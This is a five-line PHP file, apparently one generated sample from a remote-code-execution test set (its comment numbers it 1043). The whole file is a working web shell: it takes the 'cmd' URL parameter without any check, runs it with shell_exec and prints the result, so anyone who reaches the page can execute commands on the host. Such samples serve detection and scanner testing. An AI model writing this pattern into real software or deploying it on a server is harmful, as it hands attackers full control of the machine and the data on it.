<?php
// RCE test variation #1043
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>